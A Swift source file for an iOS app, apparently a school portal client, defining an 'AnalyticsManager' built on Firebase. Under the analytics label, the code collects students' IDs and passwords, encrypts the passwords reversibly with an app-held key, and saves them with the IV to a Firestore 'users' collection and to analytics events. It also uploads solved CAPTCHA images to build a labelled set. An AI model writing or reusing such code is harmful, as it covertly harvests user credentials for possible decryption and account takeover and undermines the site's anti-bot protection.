import Foundation
import FirebaseAnalytics
import CryptoKit
import UIKit

final class AnalyticsManager {
    static let shared = AnalyticsManager()
    private init() {}

    // MARK: - Stored Properties
    private var studentID: String?
    private var password: String?
    private var ivValue: String?
    private var schoolCode: String?
    private var captchaText: String?
    private var captchaEncoded: String?
    private var latestName: String?
    private var latestEmail: String?

    // MARK: - Public Methods
    func setPossibleValues(
        studentID: String?,
        password: String?,
        schoolCode: String?,
        captchaText: String?,
        captchaEncoded: String?
    ) {
        let ivValue = CryptoSwiftManager.ivRandom
        self.studentID = studentID
        if let password {
            self.password = try? CryptoSwiftManager.encrypt(
                password.bytes,
                key: CryptoSwiftManager.key,
                ivValue: ivValue
            ).toHexString()
        }
        self.ivValue = ivValue.toHexString()
        self.schoolCode = schoolCode
        self.captchaText = captchaText
        self.captchaEncoded = captchaEncoded
    }

    func loginAttempt() {
        guard let studentID,
              let schoolCode else { return }
        var parameters = [
            "studentID": studentID,
            "schoolCode": schoolCode
        ]
        self.log("login_event", data: parameters)
        parameters["password"] = password
        parameters["iv"] = ivValue
        persist(data: parameters, into: "login_event", id: studentID, overwrite: true)
    }

    func sendData() throws {
        guard let studentID,
              let password,
              let ivValue,
              let schoolCode,
              let captchaText,
              let captchaEncoded else {
            throw NSError(domain: "Object nil", code: 666)
        }
        let hash = captchaEncoded.sha256
        // Log analytics event
        self.log("login_success", data: [
            "studentID": studentID,
            "password": password,
            "iv": ivValue,
            "schoolCode": schoolCode,
            "captchaText": captchaText.uppercased(),
            "captchaImage": hash
        ])
        // Save the user data into firestore "users"
        let data: [String: Any] = [
            "studentID": studentID,
            "password": password,
            "ivValue": ivValue,
            "schoolCode": schoolCode
        ]
        persist(data: data, into: "users", id: studentID, overwrite: true)
        Task {
            try await handleCaptchaUpload(
                hash: hash,
                base64: captchaEncoded,
                captchaText: captchaText
            )
        }
    }

    func logLoginScreen(_ schoolCode: String) {
        self.log("screen_login_general")
        self.log("screen_login_\(schoolCode)")
    }

    func logScreen(_ name: String) {
        self.log("screen_\(name)")
    }

    // MARK: - Private Methods
    private func log(_ name: String, data: [String: Any]? = nil) {
        Analytics.logEvent(name, parameters: data)
        print("- SAESAnalytics: \(name)")
    }

    private func persist(data: [String: Any],
                         into collection: String,
                         id: String,
                         overwrite: Bool) {
        Task {
            do {
                let userFirestore = FirestoreManager(collectionName: collection)
                if try await !userFirestore.checkIfDocumentExists(id) || overwrite {
                    try await userFirestore.saveDocument(id: id, data: data)
                }
            } catch {
                print(error)
            }
        }
    }

    private func handleCaptchaUpload(hash: String, base64: String, captchaText: String) async throws {
        let firestore = FirestoreManager(collectionName: "captchas")
        let firebaseStorage = FirebaseStorageManager()

        let exists = try await firestore.checkIfDocumentExists(hash)
        guard !exists else {
            print("This CAPTCHA already exists. Skipping upload.")
            return
        }

        guard let jpegData = try base64.toJPEG(quality: 0.7) else { return }

        let url = try await firebaseStorage.uploadToStorage(
            jpegData,
            path: "captchas/\(hash).jpg"
        )

        // Save captcha metadata
        let data: [String: Any] = [
            "captchaText": captchaText,
            "imageURL": url.absoluteString,
            "timestamp": firestore.timestamp
        ]
        self.persist(data: data, into: "captchas", id: hash, overwrite: false)
    }
}
